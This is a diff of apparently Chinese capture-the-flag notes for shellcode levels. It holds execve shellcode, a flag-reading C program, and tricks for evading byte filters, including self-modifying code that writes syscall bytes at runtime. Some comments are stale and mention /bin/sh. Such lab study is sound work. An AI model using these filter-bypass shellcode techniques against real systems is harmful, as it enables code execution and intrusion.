@@ -450,4 +450,147 @@ error:
 
 execve函数
 
-##
+```asm
+BITS 64
+
+section .text
+global _start
+
+_start:
+    jmp short call_shellcode
+
+get_address:
+    pop rdi                     ; 将字符串地址弹出到RDI中
+    xor rsi, rsi                ; 清空RSI
+    xor rdx, rdx                ; 清空RDX
+    mov al, 0x3b                ; syscall编号execve
+    syscall                     ; 执行系统调用
+
+call_shellcode:
+    call get_address            ; 调用get_address来获取字符串地址
+    db '/home/hacker/Shellcode/level3/openflag'               ; 存储字符串/bin/sh，X是占位符，避免NULL字节
+
+```
+
+openflag
+
+```c
+#include<stdio.h>
+
+int main(){
+    char* filename = "/flag";
+    int fd;
+    fd = open(filename,0);
+    char buffer[100];
+    read(fd,buffer, 100);
+    puts(buffer);
+}
+```
+
+## level4
+
+第4关，shellcode中不然包含0x48，然后我就替换了一下level3中的汇编。把xor指令换成mov指令了。
+
+还是通过execve运行openflag程序。
+
+```asm
+BITS 64
+
+section .text
+global _start
+
+_start:
+    jmp short call_shellcode
+
+get_address:
+    pop rdi                     ; 将字符串地址弹出到RDI中
+    mov rsi, 0                  ; 清空RSI
+    mov rdx, 0                  ; 清空RDX
+    mov al, 0x3b                ; syscall编号execve
+    syscall                     ; 执行系统调用
+
+call_shellcode:
+    call get_address            ; 调用get_address来获取字符串地址
+    db '/home/hacker/Shellcode/level3/openflag',0x0             ; 存储字符串/bin/sh，X是占位符，避免NULL字节
+
+```
+
+
+
+## level5
+
+第五关shellcode中，不让包含syscall--0f05、sysenter--0f34、int--80cd这些字节。
+但是存储代码的栈空间是可以修改，可以读写、可以运行的。所以我们的思路，可以通过在汇编运行运行的期间，动态修改后续需要执行的指令。
+
+```asm
+
+
+BITS 64
+
+section .data
+    filename db '/home/hacker/Shellcode/level3/openflag',0x0             ; 存储字符串/bin/sh，X是占位符，避免NULL字节
+
+section .text
+    global _start
+
+_start:
+    jmp short call_code
+
+code:
+    pop rsi                      ; 将下一条指令地址保存到 rsi 寄存器--times 0x10 nop的首地址
+    push rsi
+    mov byte [rsi-8], 0x0f        ; 将 0x0f 写入地址 rsi-8 # 这个地址的位置就是 call rax的地址
+    mov byte [rsi-7], 0x05       ; 将 0x05 写入地址 rsi-7 
+    xor rax, rax                 ; 清空 rax
+    mov al, 0x3b                 ; 将 59 (sys_execve) 移动到 rax
+    lea rdi, [rel filename]      ; 将字符串 filename 移动到 rdi
+    xor rsi, rsi                 ; 清空 rsi
+    xor rdx, rdx                 ; 清空 rdx
+    call rax                     ; 前面的mov byte [rsi-8], 0x0f 和 mov byte [rsi-7], 会将0x05 这个地方修改为syscall 指令
+    ret
+
+call_code:
+    call code                    ; 跳转到 code 标签并将返回地址压入栈
+    times 0x10 nop               ; 0x10个 nop 指令
+    
+
+
+=> 0x1c121004:  movb   $0xf,-0x8(%rsi)
+   0x1c121008:  movb   $0x5,-0x7(%rsi)
+   0x1c12100c:  xor    %rax,%rax
+   0x1c12100f:  mov    $0x3b,%al
+   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
+   0x1c121018:  xor    %rsi,%rsi
+   0x1c12101b:  xor    %rdx,%rdx
+   0x1c12101e:  call   *%rax
+   0x1c121020:  ret
+   0x1c121021:  call   0x1c121002
+   0x1c121026:  nop
+   0x1c121027:  nop
+   0x1c121028:  nop
+   0x1c121029:  nop
+   0x1c12102a:  nop
+   0x1c12102b:  nop
+   0x1c12102c:  nop
+
+=> 0x1c12100c:  xor    %rax,%rax
+   0x1c12100f:  mov    $0x3b,%al
+   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
+   0x1c121018:  xor    %rsi,%rsi
+   0x1c12101b:  xor    %rdx,%rdx
+   0x1c12101e:  syscall
+   0x1c121020:  ret
+   0x1c121021:  call   0x1c121002
+   0x1c121026:  nop
+   0x1c121027:  nop
+   0x1c121028:  nop
+   0x1c121029:  nop
+   0x1c12102a:  nop
+   0x1c12102b:  nop
+   0x1c12102c:  nop
+   0x1c12102d:  nop
+
+```
+
+
+## level6
